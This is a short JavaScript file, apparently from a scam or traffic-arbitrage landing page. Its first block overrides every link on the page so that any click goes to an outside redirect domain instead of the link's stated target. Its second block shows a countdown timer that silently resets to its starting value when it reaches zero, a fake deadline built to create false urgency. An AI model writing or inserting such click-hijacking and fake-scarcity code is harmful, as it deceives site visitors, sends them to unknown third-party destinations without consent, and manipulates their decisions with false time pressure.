document.querySelectorAll("a").forEach((elem) => {
	elem.onclick = function (e) {
		e.preventDefault();
		window.location.href = "https://redirecttraff.site/mYB2FjQB";
		return false;
	};
});

document.addEventListener("DOMContentLoaded", function () {
	const timerBlock = document.querySelector(
		".timer__block__row span:nth-child(2)"
	);

	const startHours = 16;
	const startMinutes = 14;
	const startSeconds = 59;

	let hours = startHours;
	let minutes = startMinutes;
	let seconds = startSeconds;

	function updateTimerDisplay() {
		timerBlock.textContent = `${String(hours).padStart(2, "0")} : ${String(
			minutes
		).padStart(2, "0")} : ${String(seconds).padStart(2, "0")}`;
	}

	function countdown() {
		if (seconds > 0) {
			seconds--;
		} else {
			if (minutes > 0) {
				minutes--;
				seconds = 59;
			} else {
				if (hours > 0) {
					hours--;
					minutes = 59;
					seconds = 59;
				} else {
					hours = startHours;
					minutes = startMinutes;
					seconds = startSeconds;
				}
			}
		}

		updateTimerDisplay();
	}

	updateTimerDisplay();
	setInterval(countdown, 1000);
});
